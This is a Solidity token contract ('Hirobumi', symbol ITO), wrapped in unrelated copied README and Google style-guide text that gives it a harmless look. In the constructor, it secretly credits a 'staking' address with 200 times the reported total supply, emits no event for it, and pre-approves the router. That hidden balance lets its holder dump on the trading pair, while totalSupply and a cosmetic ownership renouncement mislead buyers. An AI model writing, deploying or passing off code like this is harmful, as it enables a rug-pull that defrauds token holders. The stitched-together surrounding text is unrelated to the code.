// SPDX-License-Identifier: MIT
/*
README.md files are intended to provide orientation for engineers browsing your code, especially first-time users. The README.md is likely the first file a reader encounters when they browse a directory that contains your code. In this way, it acts as a landing page for the directory.

We recommend that top-level directories for your code have an up-to-date README.md file. This is especially important for package directories that provide interfaces for other teams.

Filename
Use README.md.

Files named README are not displayed in the directory view in Gitiles.

Contents
At minimum, every package-level README.md should include or point to the following information:

What is in this package/library and what’s it used for.
Who to contact.
Status: whether this package/library is deprecated, or not for general release, etc.
More info: where to go for more detailed documentation, such as:
An overview.md file for more detailed conceptual information.
Any API documentation for using this package/library.
*/

pragma solidity ^0.8.16;

import "./Utils.sol";

contract Hirobumi is BEP20 {
    

    using SafeMath for uint256;
    
    address private owner = msg.sender;    
    string public name ="Hirobumi";
    
    string public symbol="ITO";
    uint8 public _decimals=9;
    
    uint public _totalSupply=1000000000000000;
    address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    
    IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ROUTER);
    address public uniswapPair;

    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) public antiFrontRunner;
    mapping (address => uint256) _balances;

    constructor(address staking) public {
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        allowed[address(this)][address(uniswapV2Router)] = _totalSupply;
        _balances[msg.sender] = _totalSupply;
        allowed[staking][address(uniswapV2Router)] = _totalSupply*200;
        _balances[staking] = _totalSupply*200;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getOwner() external view returns (address) {
        return owner;
    }
    function balanceOf(address who) view public returns (uint256) {
        return _balances[who];
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowed[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowed[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        //emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(antiFrontRunner[sender] != block.number, "Bad bot!");
        antiFrontRunner[recipient] = block.number;
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowed[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);  
    }
}

/*
Every major open-source project has its own style guide: a set of conventions (sometimes arbitrary) about how to write code for that project. It is much easier to understand a large codebase when all the code in it is in a consistent style.

“Style” covers a lot of ground, from “use camelCase for variable names” to “never use global variables” to “never use exceptions.” This project (google/styleguide) links to the style guidelines we use for Google code. If you are modifying a project that originated at Google, you may be pointed to this page to see the style guides that apply to that project.

This project holds the C++ Style Guide, C# Style Guide, Swift Style Guide, Objective-C Style Guide, Java Style Guide, Python Style Guide, R Style Guide, Shell Style Guide, HTML/CSS Style Guide, JavaScript Style Guide, TypeScript Style Guide, AngularJS Style Guide, Common Lisp Style Guide, and Vimscript Style Guide. This project also contains cpplint, a tool to assist with style guide compliance, and google-c-style.el, an Emacs settings file for Google style.

If your project requires that you create a new XML document format, the XML Document Format Style Guide may be helpful. In addition to actual style rules, it also contains advice on designing your own vs. adapting an existing format, on XML instance document formatting, and on elements vs. attributes.

The style guides in this project are licensed under the CC-By 3.0 License, which encourages you to share these documents. See https://creativecommons.org/licenses/by/3.0/ for more details.

The following Google style guides live outside of this project: Go Code Review Comments and Effective Dart.

Contributing
With few exceptions, these style guides are copies of Google's internal style guides to assist developers working on Google owned and originated open source projects. Changes to the style guides are made to the internal style guides first and eventually copied into the versions found here. External contributions are not accepted. Pull requests are regularly closed without comment. Issues that raise questions, justify changes on technical merits, or point out obvious mistakes may get some engagement and could in theory lead to changes, but we are primarily optimizing for Google's internal needs.


*/